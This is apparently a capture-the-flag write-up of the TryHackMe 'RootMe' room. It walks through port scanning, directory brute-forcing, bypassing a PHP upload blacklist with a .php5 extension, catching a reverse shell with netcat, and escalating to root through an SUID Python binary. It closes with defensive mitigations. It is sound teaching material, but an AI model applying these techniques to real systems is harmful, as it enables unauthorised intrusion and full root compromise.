# TryHackMe: RootMe - Write-up

## 🎯 Overview
**Difficulty:** Easy | **Platform:** TryHackMe
**Room Link:** [https://tryhackme.com/room/rrootme](https://tryhackme.com/room/rrootme)

This room focuses on basic web enumeration, bypassing a file upload filter using alternative PHP extensions, establishing a reverse shell, and escalating privileges via a misconfigured SUID binary (Python).

---

## 🔍 1. Reconnaissance
I started the assessment with a standard Nmap scan to discover open ports and running services on the target.

`nmap -sV -sC <TARGET_IP>`

**Open ports discovered:**
* `22/tcp` - SSH (OpenSSH 8.2p1 Ubuntu)
* `80/tcp` - HTTP (Apache httpd 2.4.41)

---

## 📂 2. Web Enumeration
Since port 80 was open, I investigated the web server. To uncover hidden directories, I ran a directory brute-force attack using **Gobuster**.

`gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt`

**Key directories found:**
* `/panel/` - A file upload page.
* `/uploads/` - The directory where uploaded files are stored.

---

## 🚪 3. Initial Access (Reverse Shell)
I navigated to `http://<TARGET_IP>/panel/` and found an upload form. The goal was to upload a PHP reverse shell to gain execution on the server.

### Bypassing the Upload Filter
I attempted to upload a standard `shell.php` payload, but the application blocked it with a "PHP is not permitted" error. The developers implemented a blacklist filtering `.php` extensions. 

To bypass this, I renamed the payload to use an alternative PHP extension (`.php5`):
`mv shell.php shell.php5`

The `.php5` file was successfully uploaded. (Note: `.phtml` also works on this configuration).

### Triggering the Shell
1. I set up a Netcat listener on my attacking machine:
   `nc -lvnp 1234`
2. I navigated to the `/uploads/` directory on the web server and clicked on `shell.php5`.
3. The server executed the payload, sending a reverse connection back to my terminal.

*Result:* Gained a shell as the `www-data` user.

### User Flag
I located the first flag by searching the file system for `user.txt`:
`find / -type f -name user.txt 2>/dev/null`
*Path found:* `/var/www/user.txt`
*Flag captured successfully.*

---

## 🔓 4. Privilege Escalation
As a low-privileged user (`www-data`), I began enumerating the system for privilege escalation vectors, starting with binaries that had the SUID bit set.

`find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`

Reviewing the output, I found a highly critical misconfiguration:
`-rwsr-xr-x 1 root root 3657904 Dec  9  2024 /usr/bin/python`

The Python binary had the SUID bit set, allowing any user to execute Python code as `root`.

### Exploiting SUID Python (GTFOBins)
I cross-referenced this finding with GTFOBins and executed the following one-liner to spawn a root shell, preserving the elevated privileges (`-p`):

`/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

*Result:* Successfully escalated to `root` (`#`).

I navigated to the root directory and captured the final flag:
`cat /root/root.txt`
*Flag captured successfully.*

---

## 🛡️ Mitigation & Takeaways (Blue Team)
1. **Secure File Uploads:** Blacklisting specific extensions (like `.php`) is ineffective. The application should use a strict **whitelist** approach, allowing only expected file types (e.g., `.png`, `.jpg`, `.pdf`).
2. **Remove Execution Permissions:** The `/uploads/` directory on the web server should be configured so that files within it cannot be executed by the server engine (e.g., disabling PHP execution in that specific folder via `.htaccess` or Apache config).
3. **Audit SUID Binaries:** The SUID bit must be removed from `/usr/bin/python`. Compilers and interpreters should never run with SUID permissions as they offer trivial sandbox escapes. 
   *(Fix: `chmod u-s /usr/bin/python`)*
